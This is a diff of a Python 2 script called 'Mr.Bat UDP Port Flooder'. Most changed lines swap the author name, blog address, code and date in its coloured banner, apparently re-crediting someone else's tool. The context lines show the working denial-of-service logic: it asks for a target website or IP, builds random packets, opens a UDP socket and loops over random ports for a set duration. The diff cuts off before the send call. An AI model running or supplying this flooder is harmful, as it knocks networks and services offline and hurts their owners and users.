@@ -62,22 +62,22 @@ def logo():
                               ##   ####
                                     ###
                                  \033[33m    ##\033[31m
-          \033[33m-by \033[31mS\033[33mutariya \033[31mP\033[33marixit\033[31m        \033[33m#\033[31m
+          \033[33m-by \033[31mS\033[33Ganesh \033[31mP\033[33Jadhao\033[31m        \033[33m#\033[31m
 \n\t     \033[31m\033[1m[_\033[33mIP Flooder\033[31m_]
  \n\033[0m\033[1m
-\t \033[33m\033[1m[-] \033[0m\033[1mPlatform : \033[33m\033[1mAndroid Termux
+\t \033[33m\033[1m[-] \033[0m\033[1mPlatform : \033[33m\033[1mAndroid Kali linux
 \t \033[1m\033[33m\033[1m[-] \033[0m\033[1mName     : \033[33m\033[1mMr.Bat
-\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mSite     : \033[33mwww.bhai4you.blogspot.com
-\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mCoded by :\033[1m \033[33m[  \033[32m\033[1mParixit \033[33m ]
-\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mSec.Code : \033[33m\033[1m8h4i\033[0m
-\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mDate     : \033[33m\033[1m10-Dec-17\033[0m
+\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mSite     : \033[33mwww.ganeshjadhao.blogspot.com
+\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mCoded by :\033[1m \033[33m[  \033[32m\033[1mGanesh \033[33m ]
+\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mSec.Code : \033[33m\033[1m4dsec90\033[0m
+\t \033[1m\033[33m\033[1m[-] \033[0m\033[1mDate     : \033[33m\033[1m21-July-19\033[0m
   """)
 
 
-logo()
+logo() 
 
 print("\n\n\n\t\t\033[32m\033[1mMr.Bat")
-print("\033[33m\033[1m       UDP Port Flooder By \033[31m8h4i\033[0m")
+print("\033[33m\033[1m       UDP Port Flooder By \033[31mGanesh\033[0m")
 
 attack = raw_input("\n\n\n\033[1mWebsite or IP ==> \033[33m")
 
@@ -89,7 +89,7 @@ durclock = (lambda:0, time.clock)[duration > 0]
 duration = (1, (durclock() + duration))[duration > 0]
 packet = random._urandom(package)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-print("Mr.Bat Attack Started on \033[32m%s \033[33mwith \033[32m%s\033[33m bytes for \033[32m%s\033[33m seconds." % (attack, package, duration))
+print("Mr.Bat Attack By Ganesh Started on \033[32m%s \033[33mwith \033[32m%s\033[33m bytes for \033[32m%s\033[33m seconds." % (attack, package, duration))
 while True:
         if (durclock() < duration):
                 port = random.randint(1, 65535)
